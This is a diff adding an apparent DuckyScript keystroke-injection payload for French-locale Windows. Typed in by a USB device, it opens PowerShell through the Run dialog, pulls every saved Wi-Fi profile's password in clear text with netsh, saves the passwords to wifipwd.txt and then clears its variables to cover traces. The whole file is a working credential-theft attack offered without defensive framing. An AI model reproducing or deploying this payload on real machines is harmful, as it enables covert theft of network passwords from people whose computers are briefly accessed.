@@ -1,0 +1,40 @@
+LOCALE FR
+DELAY 2000
+GUI r
+DELAY 1000
+DELETE
+STRING powershell.exe
+DELAY 500
+ENTER
+DELAY 1000
+STRING $SSIDList=((netsh wlan show profiles) -match '\s{2,}:\s') -replace '.*:\s' , ''
+DELAY 500
+ENTER
+DELAY 500
+STRING $ClearWifiPwd=Foreach($SSID in $SSIDList){ echo $SSID ; netsh wlan show profile name=$SSID key=clear | Where{ ($_ -match "Contenu de la clé") } }
+DELAY 500
+ENTER
+DELAY 500
+STRING echo $ClearWifiPwd
+DELAY 500
+ENTER
+DELAY 500
+STRING echo $ClearWifiPwd | Out-File -FilePath ./wifipwd.txt
+DELAY 500
+ENTER
+DELAY 500
+STRING Remove-variable ClearWifiPwd
+DELAY 500
+ENTER
+DELAY 500
+STRING Remove-variable SSIDList
+DELAY 500
+ENTER
+DELAY 500
+STRING Remove-variable SSID
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 500
+ENTER
